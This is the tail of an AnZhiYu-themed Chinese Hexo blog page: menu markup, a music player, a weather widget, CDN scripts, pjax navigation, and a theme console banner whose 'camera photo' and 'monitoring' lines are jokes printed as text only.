Top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div id="he-plugin-simple"></div><script>var WIDGET = {
+  "CONFIG": {
+    "modules": "0124",
+    "background": "2",
+    "tmpColor": "FFFFFF",
+    "tmpSize": "16",
+    "cityColor": "FFFFFF",
+    "citySize": "16",
+    "aqiColor": "E8D87B",
+    "aqiSize": "16",
+    "weatherIconSize": "24",
+    "alertIconSize": "18",
+    "padding": "10px 10px 10px 10px",
+    "shadow": "0",
+    "language": "auto",
+    "borderRadius": "20",
+    "fixed": "true",
+    "vertical": "top",
+    "horizontal": "left",
+    "left": "20",
+    "top": "7.1",
+    "key": "df245676fb434a0691ead1c63341cd94"
+  }
+}
+</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/10/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2023 By 安知鱼 V1.6.8",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 薯条 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "visitor@anheyu.com";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
